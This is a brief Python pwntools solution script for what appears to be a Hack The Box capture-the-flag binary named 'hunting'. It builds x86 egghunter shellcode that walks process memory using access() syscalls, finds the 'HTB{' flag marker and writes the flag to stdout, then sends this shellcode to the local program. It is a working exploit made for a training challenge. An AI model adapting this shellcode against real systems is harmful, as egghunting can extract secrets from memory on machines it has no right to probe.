#!/usr/bin/python3
from pwn import process, asm

shell = process("./hunting")

egghunter = asm("""
push 0x1b             # alarm()
pop eax               # $eax = alarm()
int 0x80              # syscall

mov edi, 0x7b425448   # $edi = HTB{
cdq                   # $edx = 0x0

.page:
    or dx, 0xfff      # get last addr in page

.find:
   inc edx            # increase memory counter
   pushad             # save registers
   lea ebx, [edx + 4] # $ebx = address
   xor ecx, ecx       # $ecx = 0x0
   mov al, 0x21       # $eax = access()
   int 0x80           # syscall

   cmp al, 0xf2       # cmp return with EFAULT
   popad              # restore registers
   jz .page           # if zf == 1 -> increase page
   cmp edi, [edx]     # cmp addr with HTB{
   jnz .find          # if zf == 0 -> increase addr

   mov ecx, edx       # $ecx = flag
   cdq                # $edx = 0x0
   mov ebx, edx       # $ebx = 0x0
   inc ebx            # fd
   mov dl, 0x24       # $edx = len
   mov al, 0x4        # $eax = write()
   int 0x80           # syscall
""")

shell.send(egghunter)
shell.interactive()
